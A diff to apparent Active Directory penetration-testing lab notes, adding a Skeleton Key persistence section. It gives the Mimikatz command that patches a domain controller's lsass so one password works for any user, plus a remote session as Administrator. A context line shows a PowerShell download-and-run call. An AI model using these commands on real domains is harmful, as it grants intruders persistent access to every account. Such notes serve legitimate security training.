@@ -262,3 +262,22 @@ Net.WebClient).DownloadString(''http://192.168.100.1:808
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN
 "STCheck"
 ```
+# Persistence – Skeleton Key
+>Skeleton Key Technique:<br>
+>The Skeleton Key attack involves injecting a "skeleton key" into a Windows domain controller. This skeleton key allows the attacker to bypass normal authentication
+>processes and authenticate as any user without knowing their password.
+- Skeleton key is a persistence technique where it is possible to patch a Domain Controller (lsass process) so that it allows access as any user with a single password.
+- The attack was discovered by Dell Secureworks used in a malware named the Skeleton Key malware.
+- All the publicly known methods are NOT persistent across reboots.
+- Yet again, mimikatz to the rescue.
+- Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
+```
+Invoke-Mimikatz -Command '"privilege::debug"
+"misc::skeleton"' -ComputerName dcorp-
+dc.dollarcorp.moneycorp.local
+```
+- Now, it is possible to access any machine with a valid username and password as "mimikatz"
+```
+Enter-PSSession –Computername dcorp-dc –credential
+dcorp\Administrator
+```
